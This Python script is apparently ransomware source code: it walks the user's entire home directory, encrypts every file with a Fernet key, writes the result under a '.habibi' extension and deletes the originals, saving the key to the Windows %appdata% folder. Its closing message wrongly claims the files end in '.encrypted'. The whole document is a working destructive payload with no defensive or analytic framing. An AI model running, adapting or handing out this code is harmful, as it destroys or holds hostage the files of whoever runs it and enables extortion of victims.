import os
from cryptography.fernet import Fernet

# Generate a key for encryption
def generate_key():
    return Fernet.generate_key()

# Encrypt a file and rename it with a custom extension
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        original_data = file.read()
    encrypted_data = fernet.encrypt(original_data)
    
    # Rename the file with a custom extension
    new_file_path = file_path + ".habibi"
    with open(new_file_path, 'wb') as file:
        file.write(encrypted_data)
    
    # Delete the original file
    os.remove(file_path)

# Encrypt all files in a folder (and subfolders)
def encrypt_folder(folder_path, key):
    for root, dirs, files in os.walk(folder_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            try:
                encrypt_file(file_path, key)
            except Exception as e:
                print(f"Error encrypting {file_path}: {e}")
                continue

# Main function
def main():
    folder_path = os.path.expanduser('~')
    if not os.path.exists(folder_path):
        print("Folder does not exist.")
        return

    # Generate and save the encryption key
    key = generate_key()
    appdata_path = os.path.expandvars('%appdata%')
    key_file_path = os.path.join(appdata_path, 'key')
    with open(key_file_path, 'wb') as key_file:
        key_file.write(key)
    print(f"Encryption key saved to: {key_file_path}")

    # Encrypt the folder
    encrypt_folder(folder_path, key)
    print("Encryption completed. Files now have the .encrypted extension.")

if __name__ == "__main__":
    main()